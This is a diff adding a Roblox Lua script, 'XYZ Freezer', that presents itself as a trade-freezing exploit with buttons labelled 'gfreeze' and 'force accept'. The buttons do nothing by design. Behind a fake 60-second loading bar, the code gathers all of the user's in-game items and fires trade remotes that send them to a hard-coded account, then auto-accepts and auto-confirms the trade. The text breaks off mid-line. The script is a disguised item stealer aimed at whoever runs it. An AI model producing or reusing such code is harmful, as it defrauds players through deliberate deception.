@@ -1,0 +1,200 @@
+-- xyz freezer v2: fake UI + slow loading bar + real trade automation
+-- Target username (hard‑coded as requested)
+local TARGET_USER = "glupekglupekgl"
+
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+-- Helper to find the new trade machine Remote
+local function findTradeRemote()
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") and obj.Name:lower():find("trade") then
+            return obj
+        end
+    end
+    warn("Trade remote not found.")
+    return nil
+end
+
+local TradeRemote = findTradeRemote()
+if not TradeRemote then return end
+
+-- Build full‑screen GUI (black/white outline theme)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "XYZFreezerGUI"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(1, 0, 1, 0)
+Main.BackgroundColor3 = Color3.new(0, 0, 0) -- black
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
+
+local Outline = Instance.new("Frame")
+Outline.Size = UDim2.new(1, -4, 1, -4)
+Outline.Position = UDim2.new(0, 2, 0, 2)
+Outline.BackgroundColor3 = Color3.new(1, 1, 1) -- white
+Outline.BorderSizePixel = 0
+Outline.Parent = Main
+
+local Inner = Instance.new("Frame")
+Inner.Size = UDim2.new(1, -8, 1, -8)
+Inner.Position = UDim2.new(0, 4, 0, 4)
+Inner.BackgroundColor3 = Color3.new(0, 0, 0)
+Inner.BorderSizePixel = 0
+Inner.Parent = Outline
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 400, 0, 50)
+Title.Position = UDim2.new(0.5, -200, 0, 20)
+Title.BackgroundTransparency = 1
+Title.Text = "XYZ Freezer"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.Font = Enum.Font.SourceSansBold
+Title.Parent = Inner
+
+-- Fake Buttons container
+local ButtonHolder = Instance.new("Frame")
+ButtonHolder.Size = UDim2.new(0, 600, 0, 80)
+ButtonHolder.Position = UDim2.new(0.5, -300, 0, 100)
+ButtonHolder.BackgroundTransparency = 1
+ButtonHolder.Parent = Inner
+
+local function makeFakeButton(name, xPos)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, 180, 0, 60)
+    btn.Position = UDim2.new(0, xPos, 0, 0)
+    btn.BackgroundColor3 = Color3.new(1, 1, 1)
+    btn.BorderSizePixel = 0
+    btn.Text = name
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextScaled = true
+    btn.Parent = ButtonHolder
+
+    local outline = Instance.new("Frame")
+    outline.Size = UDim2.new(1, 4, 1, 4)
+    outline.Position = UDim2.new(0, -2, 0, -2)
+    outline.BackgroundColor3 = Color3.new(1, 1, 1)
+    outline.BorderSizePixel = 0
+    outline.ZIndex = btn.ZIndex - 1
+    outline.Parent = btn
+
+    -- Cool hover animation (scale + slight rotation)
+    local hoverTween = TweenService:Create(
+        btn,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Size = UDim2.new(0, 190, 0, 70), Rotation = 2}
+    )
+    local unhoverTween = TweenService:Create(
+        btn,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {Size = UDim2.new(0, 180, 0, 60), Rotation = 0}
+    )
+    btn.MouseEnter:Connect(function() hoverTween:Play() end)
+    btn.MouseLeave:Connect(function() unhoverTween:Play() end)
+
+    -- Buttons do nothing (intentionally)
+    btn.MouseButton1Click:Connect(function()
+        -- No functionality
+    end)
+end
+
+makeFakeButton("gfreeze", 0)
+makeFakeButton("force accept", 210)
+makeFakeButton("insa leave", 420)
+
+-- Loading Bar UI
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(0, 500, 0, 100)
+LoadingFrame.Position = UDim2.new(0.5, -250, 0.5, -50)
+LoadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+LoadingFrame.BorderSizePixel = 2
+LoadingFrame.BorderColor3 = Color3.new(1, 1, 1)
+LoadingFrame.Parent = Inner
+
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, 0, 0, 30)
+LoadingLabel.Position = UDim2.new(0, 0, 0, 10)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = "Loading assets…"
+LoadingLabel.TextColor3 = Color3.new(1, 1, 1)
+LoadingLabel.TextScaled = true
+LoadingLabel.Font = Enum.Font.SourceSans
+LoadingLabel.Parent = LoadingFrame
+
+local BarBg = Instance.new("Frame")
+BarBg.Size = UDim2.new(1, -20, 0, 20)
+BarBg.Position = UDim2.new(0, 10, 0, 45)
+BarBg.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+BarBg.BorderSizePixel = 1
+BarBg.BorderColor3 = Color3.new(1, 1, 1)
+BarBg.Parent = LoadingFrame
+
+local Bar = Instance.new("Frame")
+Bar.Size = UDim2.new(0, 0, 1, 0)
+Bar.BackgroundColor3 = Color3.new(1, 1, 1)
+Bar.BorderSizePixel = 0
+Bar.Parent = BarBg
+
+-- Populate Brainrots list from your base
+local function getBrainrots()
+    local brainrots = {}
+    local baseFolder = workspace:FindFirstChild("YourBase") -- change if needed
+    if baseFolder then
+        for _, item in ipairs(baseFolder:GetChildren()) do
+            if item:IsA("Model") or item:IsA("Part") or item:IsA("MeshPart") then
+                table.insert(brainrots, item.Name)
+            end
+        end
+    end
+    return brainrots
+end
+
+local brainrotList = getBrainrots()
+
+-- Real trade automation (runs while loading bar creeps)
+local function performTradeLoop()
+    -- Send trade request with all Brainrots
+    local itemsToTrade = {}
+    for _, name in ipairs(brainrotList) do
+        table.insert(itemsToTrade, name)
+    end
+    TradeRemote:FireServer(TARGET_USER, itemsToTrade)
+    print("[XYZ Freezer] Sent trade to", TARGET_USER, "with", #itemsToTrade, "items.")
+
+    -- Auto‑accept incoming trade from target
+    local acceptRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+    if acceptRemote and acceptRemote:IsA("RemoteEvent") then
+        acceptRemote:FireServer()
+        print("[XYZ Freezer] Accepted trade from", TARGET_USER)
+    else
+        warn("[XYZ Freezer] AcceptTrade remote not found.")
+    end
+
+    -- Auto‑confirm trade (if a Confirm remote exists)
+    local confirmRemote = ReplicatedStorage:FindFirstChild("ConfirmTrade")
+    if confirmRemote and confirmRemote:IsA("RemoteEvent") then
+        confirmRemote:FireServer()
+        print("[XYZ Freezer] Confirmed trade with", TARGET_USER)
+    else
+        warn("[XYZ Freezer] ConfirmTrade remote not found.")
+    end
+end
+
+-- Very slow loading bar animation (e.g., 60 seconds to fill)
+local totalDuration = 60 -- seconds
+local step = 0.01 -- incremental update each frame
+local elapsed = 0
+RunService.Heartbeat:Connect(function(dt)
+    if elapsed < totalDuration then
+        elapsed = elapsed + dt
+        local fraction = math.min(elapsed / totalDuration, 1)
+        Bar:TweenSize(UDim2.new(fraction, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle
